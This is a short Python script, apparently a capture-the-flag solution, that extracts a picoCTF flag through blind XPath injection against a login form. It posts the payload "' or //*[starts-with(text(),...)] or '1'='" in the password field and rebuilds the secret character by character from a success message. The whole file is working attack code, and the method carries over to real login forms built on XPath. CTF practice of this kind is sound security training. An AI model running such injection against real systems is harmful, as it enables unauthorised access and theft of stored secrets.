import requests
from string import *

charecters = ascii_lowercase + digits+"}_"
print(charecters)

seen_password = ["picoCTF{"]
while "}" not in seen_password:

    for ch in charecters:
        print(f"trying {''.join(seen_password)+ch}")
        st = ''.join(seen_password)+ch
        data = {"name":"admin", "pass":f"' or //*[starts-with(text(),'{st}')] or '1'='"}
        r = requests.post("http://mercury.picoctf.net:53735/", data=data)

        content = r.text
        if "You&#39;re on the right path." in content:
            seen_password.append(ch)
            break
